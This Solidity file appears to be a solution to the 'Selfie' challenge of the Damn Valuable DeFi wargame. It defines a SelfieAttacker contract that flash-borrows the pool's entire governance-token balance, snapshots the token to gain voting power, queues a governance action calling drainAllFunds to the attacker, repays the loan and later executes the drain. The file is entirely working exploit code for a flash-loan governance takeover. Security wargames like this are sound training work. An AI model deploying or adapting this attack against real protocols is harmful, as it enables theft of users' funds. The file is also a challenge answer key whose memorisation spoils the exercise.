// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "../selfie/SimpleGovernance.sol";
import "../selfie/SelfiePool.sol";

contract SelfieAttacker {
    SimpleGovernance private governance;
    SelfiePool private pool;
    DamnValuableTokenSnapshot private snapshotToken;

    address private attacker;
    uint256 private actionId;

    constructor(
        address _governanceAddress,
        address _poolAddress,
        address _snapshotTokenAddress
    ) {
        governance = SimpleGovernance(_governanceAddress);
        pool = SelfiePool(_poolAddress);
        snapshotToken = DamnValuableTokenSnapshot(_snapshotTokenAddress);

        attacker = msg.sender;
    }

    function queueAction() external {
        pool.flashLoan(snapshotToken.balanceOf(address(pool)));
    }

    function receiveTokens(address, uint256 _borrowAmount) external {
        snapshotToken.snapshot();
        bytes memory _data = abi.encodeWithSignature("drainAllFunds(address)", address(attacker));
        actionId = governance.queueAction(address(pool), _data, 0);
        snapshotToken.transfer(address(pool), _borrowAmount);
    }

    function executeAction() external {
        governance.executeAction(actionId);
    }
}
